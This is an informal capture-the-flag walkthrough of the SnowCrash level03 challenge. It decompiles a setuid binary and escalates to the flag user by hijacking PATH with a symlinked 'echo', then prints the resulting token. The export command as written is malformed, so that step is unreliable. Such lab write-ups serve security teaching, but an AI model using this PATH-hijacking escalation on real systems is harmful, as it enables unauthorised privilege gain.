when you enter lv03 and do a basis ls you get

```bash
level03@SnowCrash:~$ /bin/ls -la
total 24
dr-x------ 1 level03 level03  120 Mar  5  2016 .
d--x--x--x 1 root    users    340 Aug 30  2015 ..
-r-x------ 1 level03 level03  220 Apr  3  2012 .bash_logout
-r-x------ 1 level03 level03 3518 Aug 30  2015 .bashrc
-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
-r-x------ 1 level03 level03  675 Apr  3  2012 .profile
```
so an executable running it, it says:


```bash
level03@SnowCrash:~$ ./level03 
Exploit me
```
so decompiling it (I used gidrhra but gdb works as well)


```C
int main(int argc,char **argv,char **envp)

{
  __gid_t __rgid;
  __uid_t __ruid;
  int iVar1;
  gid_t gid;
  uid_t uid;
  
  __rgid = getegid();
  __ruid = geteuid();
  setresgid(__rgid,__rgid,__rgid);
  setresuid(__ruid,__ruid,__ruid);
  iVar1 = system("/usr/bin/env echo Exploit me");
  return iVar1;
}
```
we can conclude a few things 
1. as the files owner is flag03 (not user 03) and has s permissions that means that running this will be run as flag03 user. 
2. The user is running echo via /usr/bin/env that is weird.

Explotation let's trick the system into thinking getflag is actually echo first lets add /tmp at the start of the PATH env variable

```bash
export "/tmp:$PATH"
```
then lets create en tmp a symbolic link to getflag called echo

```bash
ln -s /bin/getflag /tmp/echo
```

and run the executable again

```bash
level03@SnowCrash:~$ ./level03 
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```